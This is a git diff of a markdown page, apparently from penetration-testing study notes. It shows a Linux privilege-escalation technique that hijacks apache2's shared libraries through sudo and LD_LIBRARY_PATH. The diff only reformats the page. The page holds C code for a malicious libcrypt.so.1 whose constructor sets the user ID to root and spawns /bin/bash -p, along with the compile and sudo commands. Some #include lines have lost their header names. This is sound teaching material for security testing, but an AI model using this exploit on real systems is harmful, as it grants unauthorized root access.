@@ -12,25 +12,23 @@ Run ldd against the apache2 program file:
 
 #### `ldd /usr/sbin/apache2`
 
-![](../../../../.gitbook/assets/1%20%2821%29.png)
+![](<../../../../.gitbook/assets/1 (21).png>)
 
-Hijacking shared objects using this method is hit or miss. Choose one from the list and try it \(libcrypt.so.1 seems to work well\).
+Hijacking shared objects using this method is hit or miss. Choose one from the list and try it (libcrypt.so.1 seems to work well).
 
-Create a file \(library\_path.c\) with the following contents:
+Create a file (library\_path.c) with the following contents:
 
-#### `#include  #include  static void hijack() __attribute__((constructor));  void hijack() {  unsetenv("LD_LIBRARY_PATH");  setresuid(0,0,0);  system("/bin/bash -p");  }` 
+#### `#include` ` #include` ` static void hijack() __attribute__((constructor));` ` void hijack() {` ` unsetenv("LD_LIBRARY_PATH");` ` setresuid(0,0,0);` ` system("/bin/bash -p");` ` }` ``
 
 Compile library\_path.c into libcrypt.so.1:
 
 #### `gcc -o libcrypt.so.1 -shared -fPIC library_path.c`
 
-Run apache2 using sudo, while setting the LD\_LIBRARY\_PATH environment variable to the current path \(where we compiled library\_path.c\):
+Run apache2 using sudo, while setting the LD\_LIBRARY\_PATH environment variable to the current path (where we compiled library\_path.c):
 
 #### `sudo LD_LIBRARY_PATH=. apache2`
 
 ![](../../../../.gitbook/assets/env4.png)
-
-
 
 
 
